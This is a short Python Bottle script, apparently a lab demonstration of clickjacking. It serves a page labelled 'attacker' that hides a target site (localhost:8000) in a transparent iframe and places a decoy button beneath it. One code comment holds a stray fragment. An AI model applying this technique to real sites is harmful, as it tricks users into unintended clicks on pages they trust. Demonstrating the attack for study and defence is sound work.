from bottle import route, run


@route("/")
def hello():
    target_url = "http://localhost:8000"
    out = '<h2>攻撃者</h2>'
    out += '<iframe '
    out += 'style="opacity:0;filter:alpha(opacity=0)"'
    out += 'src="{}">'.format(target_url)  # "t*args, **kwargs
    out += '</iframe>'
    out += '<button '
    out += 'style="position:absolute;top:120;left:40;z-index:-1">'
    out += 'ボタン</button>'
    return out


if __name__ == "__main__":
    run(host="0.0.0.0", port=8080, debug=True)
